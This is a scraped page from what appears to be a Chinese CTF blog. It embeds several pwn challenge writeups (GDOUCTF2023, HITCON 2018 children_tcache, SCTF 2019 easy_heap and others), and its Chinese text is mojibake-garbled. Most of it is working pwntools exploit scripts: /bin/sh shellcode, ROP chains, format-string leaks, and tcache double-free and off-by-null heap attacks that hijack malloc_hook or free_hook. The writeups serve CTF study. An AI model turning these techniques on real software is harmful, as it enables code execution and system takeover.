# 0x000000000040088e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400890 : pop r14 ; pop r15 ; ret
# 0x0000000000400892 : pop r15 ; ret
# 0x000000000040088b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040088f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400670 : pop rbp ; ret
# 0x0000000000400893 : pop rdi ; ret
# 0x0000000000400891 : pop rsi ; pop r15 ; ret
# 0x000000000040088d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400581 : ret

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
">HDCTF2023 å¤ç°</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/0vJHH8rer/"" data-c="
          &lt;h3 id=&#34;easy-pwn&#34;&gt;EASY PWNï¼š&lt;/h3&gt;
&lt;p&gt;ä¼ªéšæœº&lt;br&gt;
&lt;code&gt;open(&amp;quot;/dev/urandom&amp;quot;, 0)&lt;/code&gt;äº§ç”Ÿçš„éšæœºæ•°ï¼Œæ¯”è¾ƒå¯ä»¥ç”¨&lt;code&gt;\x00&lt;/code&gt;ç»•è¿‡ï¼Œçˆ†ç ´å³å¯&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


while True:
    try:
        # io=process(&amp;quot;./easypwn&amp;quot;)
        io=remote(&amp;quot;node5.anna.nssctf.cn&amp;quot;,28637)
        io.recvuntil(b&amp;quot;Password:\n&amp;quot;)
        io.sendline(b&amp;quot;\x00&amp;quot;)
        io.recvline()
        io.recvline()
        io.interactive()
    except:
        io.close()
        continue
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h3 id=&#34;shellcode&#34;&gt;Shellcodeï¼š&lt;/h3&gt;
&lt;p&gt;shellcodeæ¨¡æ¿é¢˜&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./pwn1&amp;quot;)
io=remote(&amp;quot;node5.anna.nssctf.cn&amp;quot;,28533)
leave_ret=0x40074e
ex_addr=0x6010A0
shellcode=b&amp;quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&amp;quot;
# shellcode=asm(shellcraft.sh())
io.recvuntil(b&amp;quot;Please.\n&amp;quot;)

# gdb.attach(io)
# pause()

io.send(shellcode)
io.recvuntil(b&amp;quot;Let&#39;s start!\n&amp;quot;)
payload=cyclic(0x12)+p64(ex_addr)
io.send(payload)
io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040074e : leave ; ret
# 0x000000000040028e : ret

# Unique gadgets found: 2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h3 id=&#34;çœŸç”·äººä¸‹120å±‚&#34;&gt;çœŸç”·äººä¸‹120å±‚ï¼š&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681657864643.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æœ€åä¸€æ¬¡seedé€šè¿‡gdbåŠ¨æ€è°ƒè¯•å‘ç°åœ¨ç¨³å®šåœ¨&lt;code&gt;0xA5462D92&lt;/code&gt;å·¦å³&lt;br&gt;
ä½¿ç”¨cdllæ¨¡æ‹Ÿéšæœºæ•°äº§ç”Ÿå³å¯&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=remote(&amp;quot;node5.anna.nssctf.cn&amp;quot;,28438)
# io=process(&amp;quot;./bin&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)						
cs.srand(0xA5462D92)																					

# gdb.attach(io)
# pause()

for i in range(120):
    io.recvuntil(b&amp;quot;\n&amp;quot;)
    payload=cs.rand()%4+1
    io.sendline(str(payload))

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h3 id=&#34;random&#34;&gt;RANDOMï¼š&lt;/h3&gt;
&lt;p&gt;cdllæ¨¡æ‹Ÿéšæœºæ•°ï¼Œç„¶åæ„é€ readè¯»shellcodeï¼Œæ ˆå¯å†™ï¼Œå¹¶ä¸”æœ‰hahaå‡½æ•°å¯ä»¥jmp_rspï¼Œè¿ç§»åˆ°æ ˆä¸Šå†™shellcode&lt;br&gt;
æ­¤é¢˜æœ¬åœ°è°ƒè¯•å¡ä½ï¼Œè¿œç«¯é€šã€‚ã€‚ã€‚ã€‚ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28725)
io=process(&amp;quot;./R&amp;quot;)
elf=ELF(&amp;quot;./R&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)

jmp_rsp=0x40094e
sd=cs.time(0)
cs.srand(sd)

io.recvuntil(b&amp;quot;num:\n&amp;quot;)
io.sendline(str(cs.rand()%50))
io.recvuntil(b&amp;quot;door\n&amp;quot;)

shellcode=asm(&#39;&#39;&#39;
    xor rax,rax  
    shl rdx,12   #è®¡æ•°å™¨ï¼Œ1&amp;lt;&amp;lt;12-&amp;gt;0x40000  nbytes
    mov esi,0x601700  buf=0x601700 
    syscall
    jmp rsi   #è¿ç§»åˆ°0x601700
&#39;&#39;&#39;)

gdb.attach(io)
pause()

payload=cyclic(0x28)+p64(jmp_rsp)+shellcode
io.send(payload)
shellcode=asm(shellcraft.open(&amp;quot;./flag&amp;quot;)+shellcraft.read(3,0x601200,0x50)+shellcraft.write(1,0x601200,0x50))
io.send(shellcode)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">GDOUCTF2023 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/2dY2_XTLi/"" data-c="
          &lt;h3 id=&#34;pwn&#34;&gt;PWN:&lt;/h3&gt;
&lt;h4 id=&#34;æµ‹ä¸€æµ‹&#34;&gt;æµ‹ä¸€æµ‹ï¼š&lt;/h4&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import time
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./can_can_need&amp;quot;)
# io=remote(&amp;quot;101.43.190.199&amp;quot;,20000)
elf=ELF(&amp;quot;./can_can_need&amp;quot;)

io.recvuntil(b&amp;quot;gift?gift!\n&amp;quot;)
io.sendline(b&amp;quot;cat flag&amp;quot;)

io.recvuntil(b&amp;quot;]\n&amp;quot;)
# io.send(b&amp;quot;%9$p&amp;quot;) #canary

# gdb.attach(io)
# pause()

io.sendline(b&amp;quot;%12$p&amp;quot;) #endbr4
io.recvuntil(b&amp;quot;!&amp;quot;)
# canary=int(io.recv(18),16)
endbr4=int(io.recv(14),16)
# print(&amp;quot;canary:  &amp;quot;+hex(canary))   #æ³„éœ²canary
print(&amp;quot;endbr4:  &amp;quot;+hex(endbr4))   #æ³„éœ²endbr4
base_addr=endbr4-0x13e0
sh_addr=base_addr+0x200E
gift=base_addr+0x4040
pop_rdi_ret=base_addr+0x1443 
sys_addr=base_addr+elf.plt[b&amp;quot;system&amp;quot;]



io.recvuntil(b&amp;quot;]\n&amp;quot;)
for i in range(9):
    io.sendline(b&amp;quot;+&amp;quot;)
# payload=b&amp;quot;a&amp;quot;*14+b&amp;quot;+&amp;quot;*8+p64(0)
# io.sendline(payload)
io.sendline(str(pop_rdi_ret))
io.sendline(str(pop_rdi_ret&amp;gt;&amp;gt;32))
io.sendline(str(gift))
io.sendline(str(gift&amp;gt;&amp;gt;32))
io.sendline(str(sys_addr))
io.sendline(str(sys_addr&amp;gt;&amp;gt;32))
# io.sock.shutdown(1)
io.shutdown(&#39;write&#39;)
# io.shutdown_raw(&#39;write&#39;)
# io.send(payload)

# io.close()




io.interactive()


# Gadgets information
# ============================================================
# 0x000000000000143c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000000143e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000001440 : pop r14 ; pop r15 ; ret
# 0x0000000000001442 : pop r15 ; ret
# 0x000000000000143b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000000143f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000001213 : pop rbp ; ret
# 0x0000000000001443 : pop rdi ; ret
# 0x0000000000001441 : pop rsi ; pop r15 ; ret
# 0x000000000000143d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000000101a : ret
# 0x00000000000013c4 : ret 0x64be

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;5å­—èŠ‚æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²æ ˆä¸Šåœ°å€ï¼Œåˆ©ç”¨scanfè¯»å…¥&lt;code&gt;+-&lt;/code&gt;å·ç»•è¿‡canaryï¼Œæ³¨æ„æœ€åä¸€æ¬¡è¾“å…¥ä¸º%d,4å­—èŠ‚ï¼Œè€Œä¸€ä¸ª64ä½æ ˆç©ºé—´8å­—èŠ‚ï¼Œæ³¨æ„è®¡ç®—åç§»&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;for i in range(9):
    io.sendline(b&amp;quot;+&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ­¤å¤–æœ€åè¯»å…¥æŒ‡ä»¤ä¹Ÿéœ€è¦è€ƒè™‘%dçš„é—®é¢˜ï¼Œåˆ†ä¸¤æ¬¡è¯»å…¥ï¼Œç¬¬ä¸€æ¬¡è¯»å…¥ä½å­—èŠ‚ï¼Œç¬¬äºŒæ¬¡è¯»å…¥é«˜å­—èŠ‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;io.sendline(str(pop_rdi_ret))
io.sendline(str(pop_rdi_ret&amp;gt;&amp;gt;32))
io.sendline(str(gift))
io.sendline(str(gift&amp;gt;&amp;gt;32))
io.sendline(str(sys_addr))
io.sendline(str(sys_addr&amp;gt;&amp;gt;32))
&lt;/code&gt;&lt;/pre&gt;
">TUT æ ¡èµ›éƒ¨åˆ†å¤ç°</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/gCjQE4_Iw/"" data-c="
          &lt;p&gt;libc-2.27.so,64ä½ä¿æŠ¤å…¨å¼€ï¼Œæ ‡å‡†èœå•é¢˜ï¼Œä¸åŒçš„æ˜¯æ­¤é¢˜ç”³è¯·å’Œåç»­ç¼–è¾‘å †å—å¤§å°ä¸è¶…è¿‡0x40,ä¸”æ²¡æœ‰off by oneæˆ–è€…å †æº¢å‡ºç­‰æ‰‹æ®µï¼Œä¸èƒ½åƒå¾€å¸¸ä¸€æ ·ç”³è¯·å¤§äºsmallbinå¤§å°çš„å†é‡Šæ”¾è¿›å…¥unsortedbinæ³„éœ²æˆ–è€…åˆ©ç”¨unlinkåå‘åˆå¹¶è¿›å…¥unsortedbinæ³„éœ²ï¼›&lt;br&gt;
ä½†æ˜¯æ­¤é¢˜å­˜åœ¨æŒ‡é’ˆæœªæ¸…é›¶é€ æˆçš„uaf&lt;br&gt;
å¯ä»¥åˆ©ç”¨æ­¤ç‰¹ç‚¹æ³„éœ²å †åœ°å€ï¼Œç„¶åå‡å»åç§»åˆ°heapå¼€å¤´å¤„ï¼Œtcacheå¤´éƒ¨heap+0x10åˆ°heap+0x50å‰ï¼ˆ0x40ï¼‰éƒ½æ˜¯countsï¼Œä»£è¡¨çš„æ˜¯idxæ‰€å¯¹åº”çš„ä¸åŒçš„å¤§å°çš„tcacheçš„ä¸ªæ•°ï¼Œè€Œå0x200ï¼ˆ0x40*8ï¼‰ä¸ºæŒ‡é’ˆæ•°ç»„ï¼Œå­˜æ”¾tcache_entryæŒ‡é’ˆï¼Œå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x561175c60000
Size: 0x251

Free chunk (tcache) | PREV_INUSE
Addr: 0x561175c60250
Size: 0x51
fd: 0x561175c60260

Allocated chunk | PREV_INUSE
Addr: 0x561175c602a0
Size: 0x51

Top chunk | PREV_INUSE
Addr: 0x561175c602f0
Size: 0x20d11

pwndbg&amp;gt; x/20gx 0x561175c60000
0x561175c60000: 0x0000000000000000      0x0000000000000251
0x561175c60010: 0x0000000002000000      0x0000000000000000
0x561175c60020: 0x0000000000000000      0x0000000000000000
0x561175c60030: 0x0000000000000000      0x0000000000000000
0x561175c60040: 0x0000000000000000      0x0000000000000000
0x561175c60050: 0x0000000000000000      0x0000000000000000
0x561175c60060: 0x0000000000000000      0x0000561175c60260
0x561175c60070: 0x0000000000000000      0x0000000000000000
0x561175c60080: 0x0000000000000000      0x0000000000000000
0x561175c60090: 0x0000000000000000      0x0000000000000000
pwndbg&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨å°†chunkæ”¾å…¥tcahceçš„æ—¶å€™ä¼šæ£€æŸ¥&lt;code&gt;tcache-&amp;gt;counts[tc_idx] &amp;lt; mp_.tcache_count&lt;/code&gt;ï¼Œè€Œæˆ‘ä»¬çŸ¥é“ç›¸åŒå¤§å°tcacheæœ€å¤šå­˜åœ¨7ä¸ªï¼Œå³æˆ‘ä»¬åªéœ€è¦å°†countæ”¹ä¸ºä¸å°äº7çš„æŸä¸ªæ•°å³å¯æ»¡è¶³è¯¥æ£€æŸ¥ï¼Œåç»­freeçš„å †å—ä¸ä¼šæ”¾å…¥tcacheï¼Œè€Œcountsåœ¨heapä¸Šï¼Œæˆ‘ä»¬åªéœ€è¦ä¿®æ”¹heapçš„countsä¸ºä¸å°äº7çš„æ•°å³å¯ï¼Œè¿™é“é¢˜æˆ‘ä»¬å¯ä»¥åˆ©ç”¨double freeæ¥ä¿®æ”¹heapä¸Šçš„å†…å®¹ï¼Œä¿®æ”¹åé‡Šæ”¾heapï¼Œä½¿å…¶è¿›å…¥unsortedbinè·å–main_arenaåç§»åœ°å€è¿›è€Œæ³„éœ²libcï¼›&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;delete(0)
delete(0)
show(0)
leak_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
heap_addr=leak_addr-0x260

add(0x40,p64(heap_addr+0x10)) #2
add(0x40,b&amp;quot;ddd&amp;quot;) #3
add(0x40,b&amp;quot;\x07&amp;quot;*0x40) #4
delete(4)
show(4)
libc_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¹‹åå°†heapé‡æ–°åˆ†é…ï¼ˆä½¿ç”¨edit after freeï¼Œåç»­æ›´æ”¹åœ¨chunk 0ä¸Šæ“ä½œï¼Œå†æ¬¡æ„é€ double freeï¼Œä¹‹ååŠ«æŒmalloc_hookæ‰“one_gadgetæˆ–è€…åŠ«æŒfree_hookæ„é€ å³å¯getshellï¼Œä¸çŸ¥é“æ˜¯ç‰ˆæœ¬çš„åŸå› ï¼Œæœ¬é¢˜è°ƒæ ˆæ”¹reallocåç§»æ‰“one_gadgetä¸è¡Œï¼Œæ•…æœ€åé‡‡ç”¨åŠ«æŒfree_hookæ„é€ &lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./drunk&amp;quot;)
elf=ELF(&amp;quot;./drunk&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

def add(n,c):
    io.sendlineafter(b&amp;quot;--&amp;gt;&amp;gt;&amp;gt;&amp;gt; \n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;cup:\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;add?\n&amp;quot;,c)

def delete(n):
    io.sendlineafter(b&amp;quot;--&amp;gt;&amp;gt;&amp;gt;&amp;gt; \n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;number: \n&amp;quot;,str(n))

def show(n):
    io.sendlineafter(b&amp;quot;--&amp;gt;&amp;gt;&amp;gt;&amp;gt; \n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;left: \n&amp;quot;,str(n))

def edit(n,cc):
    io.sendlineafter(b&amp;quot;--&amp;gt;&amp;gt;&amp;gt;&amp;gt; \n&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;cup:\n&amp;quot;,str(n))
    io.sendafter(b&amp;quot;refill\n&amp;quot;,cc)

add(0x40,b&amp;quot;aaa&amp;quot;) #0
add(0x40,b&amp;quot;/bin/sh\x00&amp;quot;) #1

delete(0)
delete(0)
show(0)
leak_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
heap_addr=leak_addr-0x260

add(0x40,p64(heap_addr+0x10)) #2
add(0x40,b&amp;quot;ddd&amp;quot;) #3
add(0x40,b&amp;quot;\x07&amp;quot;*0x40) #4
delete(4)
show(4)
libc_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;libc_addr: &amp;quot;+hex(libc_addr))
malloc_hook=libc_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=libc_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
realloc=libc_addr+libc.sym[b&amp;quot;__libc_realloc&amp;quot;]
sys_addr=libc_addr+libc.sym[b&amp;quot;system&amp;quot;]
one_gadget=[0x4f365,0x4f3c2,0x10a45c]
shell=libc_addr+one_gadget[2]

edit(4,b&amp;quot;\x00&amp;quot;*0x40)
delete(0)
delete(0)
add(0x40,p64(free_hook))
add(0x40,b&amp;quot;qqq&amp;quot;)
add(0x40,p64(sys_addr))
# add(0x40,p64(malloc_hook-0x8))
# add(0x40,b&amp;quot;qqq&amp;quot;)
# add(0x40,p64(shell)+p64(realloc+0x1))

gdb.attach(io)
pause()

io.sendlineafter(b&amp;quot;--&amp;gt;&amp;gt;&amp;gt;&amp;gt; \n&amp;quot;,b&amp;quot;2&amp;quot;)
io.sendlineafter(b&amp;quot;number: \n&amp;quot;,b&amp;quot;1&amp;quot;)

io.interactive()

# 0x4f365 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f3c2 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a45c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681961229895.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">ä¸€é“tcache structé¢˜ç›® drunk å¤ç°</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/fYqCaAJM-/"" data-c="
          &lt;p&gt;64ä½tcachebin attack+off by nullï¼Œä¿æŠ¤å…¨å¼€&lt;br&gt;
æ ‡å‡†èœå•ï¼Œæ­¤é¢˜ä¸‹æ ‡åˆ†é…æ˜¯ä¼˜å…ˆå æ®ç©ºé—²çš„ä¸‹æ ‡ï¼Œä»å°åˆ°å¤§é¡ºåºåˆ†é…ï¼Œstrcpyä¼šåœ¨æœ«å°¾æ·»åŠ &lt;code&gt;\x00&lt;/code&gt;é€ æˆoff by null&lt;br&gt;
å¤§è‡´æ€è·¯æ˜¯unsortedbin leakç„¶ååŠ«æŒmalloc_hookæ‰“one_gadget&lt;br&gt;
å…ˆæ”¾expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,29088)
# io=process(&amp;quot;./HITCON_2018_children_tcache&amp;quot;)
elf=ELF(&amp;quot;./HITCON_2018_children_tcache&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

def add(n,c):
    io.sendlineafter(b&amp;quot;Your choice: &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Size:&amp;quot;,str(n))
    io.sendafter(b&amp;quot;Data:&amp;quot;,c)

def show(n):
    io.sendlineafter(b&amp;quot;Your choice: &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index:&amp;quot;,str(n))

def delete(n):
    io.sendlineafter(b&amp;quot;Your choice: &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index:&amp;quot;,str(n))

add(0x440,b&amp;quot;aaa&amp;quot;) #0
add(0x68,b&amp;quot;ccc&amp;quot;) #1
add(0x4f0,b&amp;quot;ddd&amp;quot;) #2
add(0x10,b&amp;quot;bbb&amp;quot;) #3

delete(0)
delete(1)

for i in range(8):
    add(0x68-i,b&amp;quot;a&amp;quot;*(0x68-i)) #å°†é€å­—èŠ‚æ›´æ”¹ç›´åˆ°æœ€å1å­—èŠ‚
    delete(0)  #ä¸‹æ ‡ç©ºé—²å³å¯å–

add(0x68,cyclic(0x60)+p64(0x4c0)) #0
delete(2)

add(0x440,b&amp;quot;sss&amp;quot;) #1
show(0)

leak_addr=u64(io.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
libc_addr=leak_addr-0x60-0x3EBC40
malloc_hook=libc_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=libc_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
one_gadget=[0x4f2a5,0x4f302,0x10a2fc]
print(&amp;quot;libc_addr: &amp;quot;+hex(libc_addr))
shell=one_gadget[1]+libc_addr

add(0x68,b&amp;quot;eee&amp;quot;) #2  0,2å †å—é‡å 

delete(0) #main_arena-&amp;gt;0
delete(2) #main_arena-&amp;gt;2-&amp;gt;0    double free

# gdb.attach(io)
# pause()

add(0x68,p64(malloc_hook))
add(0x68,p64(malloc_hook))
add(0x68,p64(shell))

io.sendlineafter(b&amp;quot;Your choice: &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;Size:&amp;quot;,b&amp;quot;1&amp;quot;)

io.interactive() 

# 0x4f2a5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f302 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a2fc execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é¦–å…ˆåˆ†é…4ä¸ªå †å—ï¼Œidxä¸º0å’Œ2çš„å †å—å¤§äº0x410ï¼Œchunk 3é˜²æ­¢é‡Šæ”¾æ—¶ä¸top chunkåˆå¹¶&lt;br&gt;
ä½†deleteå‡½æ•°å­˜åœ¨å­—ç¬¦æ±¡æŸ“&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1681575273596.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å¦‚æœéœ€è¦è¿›è¡Œunlinkæ“ä½œåˆå¹¶å‰ä¸‰ä¸ªchunkéœ€è¦å°†chunk 2çš„presizeæ›´æ”¹ï¼Œè¿™é‡Œéœ€è¦ç”¨åˆ°forå¾ªç¯æ¯ä¸€å­—èŠ‚æ›´æ”¹ï¼Œæœ€åå†addä¿®æ”¹presizeå³å¯&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;for i in range(8):
    add(0x68-i,b&amp;quot;a&amp;quot;*(0x68-i)) 
    delete(0) 
add(0x68,cyclic(0x60)+p64(0x4c0)) 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681575981844.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ä¹‹åå†åˆ†é…å †å—ï¼Œè¿™æ ·ä¸åŒä¸‹æ ‡çš„å †å—æŒ‡å‘åŒä¸€å—å†…å­˜ç©ºé—´ï¼Œå¯ä»¥å®ç°tcachebin attackï¼Œæœ€ååŠ«æŒmalloc_hookæ‰“one_gadgetå³å¯getshellï¼Œï¼ˆåŠ«æŒfree_hookä¹Ÿè¡Œ&lt;/p&gt;
">hitcon_2018_children_tcache wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/7VDd7Yhhb/"" data-c="
          &lt;p&gt;64ä½tcachebin attack+off by null+chunk overlappingï¼Œä¿æŠ¤å…¨å¼€&lt;br&gt;
ä½†æ˜¯å­˜åœ¨mmapå¼€è¾Ÿäº†ä¸€æ®µrwxæƒé™çš„ç©ºé—´å¹¶åœ¨ç¨‹åºä¸€å¼€å§‹æ³„éœ²å‡ºæ¥ï¼›&lt;br&gt;
æ­¤é¢˜æ ‡å‡†èœå•ï¼Œæ²¡æœ‰uafæ²¡æœ‰å †æº¢å‡ºï¼Œä½†æ˜¯fillå‡½æ•°é‡Œé¢å­˜åœ¨off by null&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1681452419757.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,27185)
# io=process(&amp;quot;./sctf_2019_easy_heap&amp;quot;)
elf=ELF(&amp;quot;./sctf_2019_easy_heap&amp;quot;)

def alloc(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(n))

def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

def fill(n,c):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;Content: &amp;quot;,c)

io.recvuntil(b&amp;quot;Mmap: &amp;quot;)
mmap=int(io.recv(12),16)
print(&amp;quot;mmap: &amp;quot;+hex(mmap))

alloc(0x420) #0

alloc(0x38) #1
alloc(0x28) #2
alloc(0x4f0) #3
alloc(0x10) #4

delete(0)
payload=cyclic(0x20)+p64(0x4a0)
fill(2,payload)

delete(3)
delete(1)
delete(2)

alloc(0x460) #0

# gdb.attach(io)
# pause()

alloc(0x520) #1
payload=cyclic(0x420)+p64(0)+p64(0x41)+p64(mmap)
fill(0,payload+b&amp;quot;\n&amp;quot;)

alloc(0x38) #2
alloc(0x38) #3

payload=asm(shellcraft.sh())
fill(3,payload+b&amp;quot;\n&amp;quot;)

fill(1,b&amp;quot;\x30\n&amp;quot;)
alloc(0x28) #5
alloc(0x28) #6
payload=p64(mmap)
fill(6,payload+b&amp;quot;\n&amp;quot;)

